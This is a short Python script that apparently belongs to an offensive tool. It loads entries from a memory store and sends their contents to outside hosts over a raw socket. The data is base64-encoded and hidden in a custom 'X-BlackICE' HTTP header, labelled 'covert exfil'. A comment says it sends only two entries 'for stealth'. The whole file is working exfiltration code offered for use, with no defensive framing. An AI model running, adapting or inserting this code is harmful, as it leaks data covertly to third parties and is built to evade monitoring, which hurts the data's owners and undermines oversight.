import base64
import socket

from memory_engine import load_memory


def exfil_payload(ip, port, data):
    b64_data = base64.b64encode(data.encode()).decode()
    request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-BlackICE: {b64_data}\r\n\r\n".encode()
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((ip, int(port)))
        s.sendall(request)
        s.close()
        print(f"[+] Covert exfil to {ip}:{port}")
    except Exception as e:
        print(f"[!] Failed exfil to {ip}:{port} - {e}")


if __name__ == "__main__":
    mem = load_memory()
    for key in list(mem.keys())[:2]:  # limit to 2 top entries for stealth
        ip, port = key.split(":")
        exfil_payload(ip, port, str(mem[key]))
